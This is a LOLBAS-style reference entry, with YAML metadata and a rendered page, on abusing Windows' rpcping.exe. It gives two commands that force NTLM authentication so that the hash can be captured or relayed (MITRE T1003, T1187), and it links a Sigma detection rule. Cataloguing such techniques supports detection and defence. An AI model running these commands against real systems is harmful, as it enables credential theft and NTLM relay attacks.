---
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Handle: '@vysecurity'
  Person: Vincent Yiu
- Handle: '@splinter_code'
  Person: Antonio Cocomazzi
- Person: null
Author: Oddvar Moe
Commands:
- Category: Credentials
  Command: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
  Description: Send a RPC test connection to the target server (-s) and force the
    NTLM hash to be sent in the process.
  MitreID: T1003
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Capture credentials on a non-standard port
- Category: Credentials
  Command: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
  Description: Trigger an authenticated RPC call to the target server (/s) that could
    be relayed to a privileged resource (Sign not Set).
  MitreID: T1187
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port
Created: 2018-05-25
Description: Used to verify rpc connection
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rpcping_credential_capture.yml
Full_Path:
- Path: C:\Windows\System32\rpcping.exe
- Path: C:\Windows\SysWOW64\rpcping.exe
Name: Rpcping.exe
Resources:
- Link: https://github.com/vysec/RedTips
- Link: https://twitter.com/vysecurity/status/974806438316072960
- Link: https://twitter.com/vysecurity/status/873181705024266241
- Link: https://twitter.com/splinter_code/status/1421144623678988298
mitre_data:
  technique_ids:
  - T1003
  - T1187
tags:
- lolbas/osbinaries
---

# Rpcping.exe

Used to verify rpc connection

# Path(s)

- `C:\Windows\System32\rpcping.exe`
- `C:\Windows\SysWOW64\rpcping.exe`

# Credentials Commands

Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.

```batch
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
```

- **Usecase:** Capture credentials on a non-standard port
- **Privileges Required:** User
- **MitreID:** `T1003`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).

```batch
rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
```

- **Usecase:** Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port
- **Privileges Required:** User
- **MitreID:** `T1187`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://github.com/vysec/RedTips
- https://twitter.com/vysecurity/status/974806438316072960
- https://twitter.com/vysecurity/status/873181705024266241
- https://twitter.com/splinter_code/status/1421144623678988298
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Casey Smith (@subtee)
- Vincent Yiu (@vysecurity)
- Antonio Cocomazzi (@splinter_code)